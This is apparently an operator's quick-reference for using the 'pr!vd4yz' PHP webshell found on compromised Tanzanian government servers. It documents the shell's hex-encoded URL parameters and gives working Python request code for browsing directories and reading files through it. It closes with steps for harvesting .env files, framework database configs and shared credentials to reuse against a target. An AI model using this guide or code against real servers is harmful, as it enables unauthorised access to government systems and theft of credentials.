# pr!vd4yz Shell Quick Reference

The pr!vd4yz shell (t.me/privdayz) is a common TA webshell found on compromised
Tanzanian government servers. It has powerful features but a confusing interface.

## URL Structure
```
shell.php?pr1v=HEX_PATH&cmdnirvana=PAGE&cmdnirvana_cmd=COMMAND&f=HEX_FILENAME
```

## Key Parameters

| Param | Purpose | Example |
|-------|---------|---------|
| `pr1v` | Hex-encoded directory path | `/var/www/html` → `2f7661722f7777772f68746d6c` |
| `cmdnirvana` | Page mode | `1` = console (22KB), empty/other = menu (3.3MB) |
| `cmdnirvana_cmd` | Shell command to execute | URL-encoded |
| `f` | Hex-encoded filename to read | `.htaccess` → `2e6874616363657373` |

## File Browser (WORKS)
```python
# List directory
dir_hex = "/var/www/html".encode().hex()
r = requests.get(f"{shell_url}?pr1v={dir_hex}")

# Read file content (returns in <textarea>)
file_hex = ".htaccess".encode().hex()
r = requests.get(f"{shell_url}?pr1v={dir_hex}&f={file_hex}")
content = re.findall(r'<textarea[^>]*>(.*?)</textarea>', r.text, re.DOTALL)
```

## Command Execution (BROKEN — output not retrievable)
- Commands run (HTTP 200, 3.3MB response) but output is buried in massive HTML
- `cmdnirvana=1` gives smaller console page (22KB) but still no output
- Redirecting output to file (`> out.txt`) doesn't persist
- PHP `file_put_contents()` doesn't persist
- Shell appears to run in sandboxed/chrooted mode

## Features Menu (visible with `cmdnirvana=1`)
- File manager
- SQL manager
- Symlink creator
- Config grabber
- Linux auto-root
- chroot/jailbreak escaper

## Hex Encoding Helper
```python
def hex_str(s):
    return s.encode().hex()
# "/var/www/html/.env" → "2f7661722f7777772f68746d6c2f2e656e76"
# ".htaccess" → "2e6874616363657373"
```

## Use Case
When you find a pr!vd4yz shell on a co-host, use the file browser to:
1. Navigate webroot for `.env` files and configs
2. Read Yii2/Laravel `config/db.php` for database credentials
3. Search for shared credentials that may work on the target
4. Map the server's application structure
